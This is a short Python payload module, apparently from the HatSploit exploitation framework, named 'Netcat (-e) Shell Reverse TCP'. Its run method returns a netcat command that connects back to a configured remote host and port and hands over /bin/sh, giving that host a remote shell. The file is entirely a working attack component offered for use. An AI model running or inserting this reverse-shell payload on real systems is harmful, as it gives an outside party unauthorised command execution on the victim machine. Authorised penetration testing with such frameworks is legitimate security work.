#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Netcat (-e) Shell Reverse TCP",
        'Payload': "unix/generic/netcate_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat (-e) shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = f"nc {remote_host} {remote_port} -e /bin/sh"
        return payload
